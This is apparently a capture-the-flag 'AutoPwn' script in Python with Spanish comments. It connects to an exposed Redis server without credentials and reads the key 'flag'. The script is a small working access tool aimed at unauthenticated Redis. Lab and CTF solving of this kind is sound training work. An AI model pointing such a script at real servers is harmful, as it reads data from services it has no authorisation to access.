#!/usr/bin/python3
# Shebang - indica que el archivo debe ser interpretado con Python 3

import argparse
# Importa el módulo argparse para manejar los argumentos de línea de comandos

import redis
# Importa el módulo redis para interactuar con el servidor Redis

class Exploit:
    def __init__(self, ip_address, lport):
        self.ip_address = ip_address
        self.lport = lport
        # Inicializa la clase Exploit con una dirección IP y un puerto

    def run(self, ip_address, lport):
        # Define el método "run" para ejecutar la explotación

        # Crea una instancia del cliente Redis
        r = redis.Redis(host=self.ip_address, port=self.lport)

        # Ejecuta el comando GET para obtener el valor de la clave "flag"
        contenido = r.get("flag")

        # Verifica si se encontró un valor para la clave "flag"
        if contenido is not None:
            print(f"El contenido de la 'flag': {contenido.decode()}")
        else:
            print("La clave 'flag' no existe en Redis.")

def get_arguments():
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    # Crea un objeto ArgumentParser con una descripción

    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    # Agrega un argumento "-i" o "--ip" para la dirección IP del host remoto

    parser.add_argument('-p', '--port', dest='lport', required=True, help='Proporcionar puerto.')
    # Agrega un argumento "-p" o "--port" para el puerto

    return parser.parse_args()
    # Devuelve los argumentos analizados

def main():
    args = get_arguments()
    # Obtiene los argumentos de línea de comandos

    exploit = Exploit(args.ip_address, args.lport)
    # Crea una instancia de la clase Exploit con los argumentos proporcionados

    exploit.run(args.ip_address, args.lport)
    # Ejecuta el método "run" de la instancia de la clase Exploit

if __name__ == '__main__':
    main()
    # Ejecuta la función main si el script se ejecuta directamente (no se importa como módulo)
